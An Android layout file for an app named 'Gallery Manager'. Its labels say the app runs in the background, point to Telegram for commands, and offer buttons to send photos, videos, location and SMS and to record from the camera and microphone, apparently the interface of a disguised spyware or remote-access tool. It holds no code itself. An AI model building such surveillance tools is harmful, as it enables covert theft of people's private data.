<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#141414">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="24dp"
        android:gravity="center">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="📱 Gallery Manager"
            android:textColor="#E50914"
            android:textSize="26sp"
            android:textStyle="bold"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="App background mein chal rahi hai... Telegram par /help bhejo"
            android:textColor="#AAAAAA"
            android:layout_marginTop="8dp"
            android:layout_marginBottom="32dp"/>

        <Button
            android:id="@+id/btnPhotos"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="📷 Photos Bhejo"
            android:textSize="16sp"
            android:layout_marginBottom="12dp"/>

        <Button
            android:id="@+id/btnVideos"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="🎥 Videos Bhejo"
            android:textSize="16sp"
            android:layout_marginBottom="12dp"/>

        <Button
            android:id="@+id/btnLocation"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="📍 Location Bhejo"
            android:textSize="16sp"
            android:layout_marginBottom="12dp"/>

        <Button
            android:id="@+id/btnSMS"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="💬 SMS Bhejo"
            android:textSize="16sp"
            android:layout_marginBottom="12dp"/>

        <Button
            android:id="@+id/btnCamera"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="📸 Camera Photo"
            android:textSize="16sp"
            android:layout_marginBottom="12dp"/>

        <Button
            android:id="@+id/btnMic"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="🎙️ Mic Record (30s)"
            android:textSize="16sp"
            android:layout_marginBottom="24dp"/>

        <ProgressBar
            android:id="@+id/progress"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:visibility="gone"/>

        <TextView
            android:id="@+id/tvStatus"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Ready ✅"
            android:textColor="#4CAF50"
            android:layout_marginTop="16dp"/>

    </LinearLayout>
</ScrollView>